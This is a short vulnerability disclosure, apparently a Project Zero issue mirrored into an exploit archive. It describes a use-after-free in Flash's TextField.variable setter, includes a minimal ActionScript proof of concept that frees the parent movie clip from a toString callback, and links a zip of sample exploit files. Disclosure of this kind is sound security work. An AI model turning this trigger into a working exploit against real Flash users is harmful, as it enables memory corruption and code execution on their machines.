@@ -1,0 +1,24 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=579
+
+There is a use-after-free in the TextField.variable setter. If the variable name that is added is an object with toString defined, the toString function can free the field's parent object, which is then used. A minimal PoC is as follows:
+
+var mc = this.createEmptyMovieClip("mc", 101);
+var tf = mc.createTextField("tf", 102, 1, 1, 100, 100);
+tf.variable = {toString : func};
+
+function func(){
+
+	mc.removeMovieClip();
+
+        // Fix heap here
+
+	return "myvar";
+	
+	}
+
+A sample swf and fla are attached.
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39050.zip
+
